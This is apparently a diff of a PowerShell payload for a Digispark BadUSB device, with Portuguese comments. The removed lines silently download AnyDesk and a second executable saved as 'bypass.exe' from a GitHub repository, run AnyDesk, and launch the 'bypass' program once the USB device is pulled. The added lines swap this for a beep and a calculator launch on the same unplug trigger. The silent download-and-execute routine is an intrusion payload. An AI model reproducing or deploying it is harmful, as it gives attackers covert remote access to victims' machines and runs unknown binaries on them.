@@ -1,35 +1,23 @@
-$p = "$env:TEMP\main.exe"
-$b = "$env:TEMP\bypass.exe"
-$n = "AnyDesk"
+# Apito longo de 1 segundo para você SABER que a versão nova baixou
+[System.Console]::Beep(800, 1000)
 
-# Baixa os arquivos silenciosamente
-Invoke-WebRequest -Uri "https://github.com/nohanvs/bot-dc-dipariss7k/raw/refs/heads/main/AnyDesk.exe" -OutFile $p
-Invoke-WebRequest -Uri "https://github.com/nohanvs/bot-dc-dipariss7k/raw/refs/heads/main/SYNC-Otimizer.exe" -OutFile $b
+Start-Sleep -Seconds 3
 
-# Inicia o principal (AnyDesk)
-Start-Process $p
-
-# Espera 5 segundos para garantir que o Windows já reconheceu o teclado
-Start-Sleep -Seconds 5
-
-# Loop Vigilante: Fica monitorando o ID EXATO do seu Digispark (1C4F)
+# Usando um comando mais moderno e agressivo (Get-PnpDevice)
 while ($true) {
-    $usb = Get-WmiObject Win32_PnPEntity | Where-Object { $_.DeviceID -match '1C4F' }
-    
+    # Ele procura especificamente nos teclados e exige que o Status esteja 'OK'
+    $usb = Get-PnpDevice -Class Keyboard -ErrorAction SilentlyContinue | Where-Object { $_.InstanceId -match '1C4F' -and $_.Status -eq 'OK' }
+
     if (-not $usb) {
-        # Sumiu? Espera 2 segundos para a Prova Real (evita falsos alertas)
-        Start-Sleep -Seconds 2
-        $confirm = Get-WmiObject Win32_PnPEntity | Where-Object { $_.DeviceID -match '1C4F' }
+        # Sumiu ou o status mudou pra Erro? Confirma rápido.
+        Start-Sleep -Seconds 1
+        $confirm = Get-PnpDevice -Class Keyboard -ErrorAction SilentlyContinue | Where-Object { $_.InstanceId -match '1C4F' -and $_.Status -eq 'OK' }
         
         if (-not $confirm) {
-            # Desplugado com sucesso! Quebra o loop para fechar tudo.
+            # GATILHO ACIONADO! Abre a Calculadora
+            Start-Process calc.exe
             break
         }
     }
     Start-Sleep -Seconds 1
 }
-
-# Só chega nesta linha quando você puxa o Digispark
-# Fecha o AnyDesk forçadamente e abre o Otimizador
-Stop-Process -Name $n -Force -ErrorAction SilentlyContinue
-Start-Process $b
